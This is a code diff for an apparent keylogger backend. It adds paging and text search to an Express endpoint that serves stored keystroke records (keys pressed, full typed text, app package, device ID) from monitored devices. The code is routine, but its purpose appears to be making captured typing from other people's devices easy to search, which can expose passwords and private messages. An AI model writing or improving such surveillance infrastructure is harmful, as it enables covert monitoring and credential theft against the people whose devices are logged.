@@ -100,25 +100,45 @@ app.get("/api/devices", async (_req, res) => {
 
 app.get("/api/records", async (req, res) => {
   try {
-    const limit = Math.min(parseInt(req.query.limit, 10) || 100, 500);
+    const limit = Math.min(Math.max(parseInt(req.query.limit, 10) || 100, 1), 500);
+    const page = Math.max(parseInt(req.query.page, 10) || 1, 1);
+    const skip = (page - 1) * limit;
+    const search = String(req.query.search || "").trim();
     const filter = {};
 
     if (req.query.deviceUniqueId) {
       filter.deviceUniqueId = req.query.deviceUniqueId;
     }
 
+    if (search) {
+      const escaped = search.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
+      const regex = new RegExp(escaped, "i");
+      filter.$or = [
+        { keyPressed: regex },
+        { fullText: regex },
+        { recordId: regex },
+        { appPackage: regex },
+      ];
+    }
+
     const [records, total] = await Promise.all([
       KeystrokeRecord.find(filter)
         .sort({ createdAt: -1 })
+        .skip(skip)
         .limit(limit)
         .select("recordId deviceUniqueId keyPressed fullText appPackage action createdAt"),
       KeystrokeRecord.countDocuments(filter),
     ]);
 
+    const totalPages = Math.max(Math.ceil(total / limit), 1);
+
     res.json({
       success: true,
       total,
       count: records.length,
+      page,
+      limit,
+      totalPages,
       data: records,
     });
   } catch (error) {
